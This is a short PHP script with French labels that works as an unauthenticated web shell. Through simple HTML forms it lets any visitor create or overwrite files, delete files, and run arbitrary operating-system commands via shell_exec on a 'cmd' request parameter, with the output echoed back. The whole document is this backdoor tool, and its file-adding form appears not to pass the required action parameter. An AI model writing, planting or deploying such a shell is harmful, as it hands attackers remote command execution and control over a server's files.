<?php
if(isset($_GET['action'])){
    $action = $_GET['action'];
    
    // Ajouter un fichier
    if($action == 'add_file' && isset($_POST['filename']) && isset($_POST['content'])){
        $filename = $_POST['filename'];
        $content = $_POST['content'];
        file_put_contents($filename, $content);
        echo "Fichier ajouté : $filename";
    }

    // Supprimer un fichier
    elseif($action == 'delete_file' && isset($_GET['filename'])){
        $filename = $_GET['filename'];
        if(file_exists($filename)){
            unlink($filename);
            echo "Fichier supprimé : $filename";
        } else {
            echo "Le fichier n'existe pas.";
        }
    }

    // Exécuter une commande
    elseif($action == 'execute' && isset($_GET['cmd'])){
        $cmd = $_GET['cmd'];
        echo "<pre>";
        echo shell_exec($cmd);
        echo "</pre>";
    }
}
?>

<form method="POST">
    <h3>Ajouter un fichier</h3>
    Nom du fichier : <input type="text" name="filename"><br>
    Contenu : <textarea name="content"></textarea><br>
    <input type="submit" value="Ajouter un fichier">
</form>

<form method="GET">
    <h3>Supprimer un fichier</h3>
    Nom du fichier : <input type="text" name="filename"><br>
    <input type="submit" name="action" value="delete_file">
</form>

<form method="GET">
    <h3>Exécuter une commande</h3>
    Commande : <input type="text" name="cmd"><br>
    <input type="submit" name="action" value="execute">
</form>
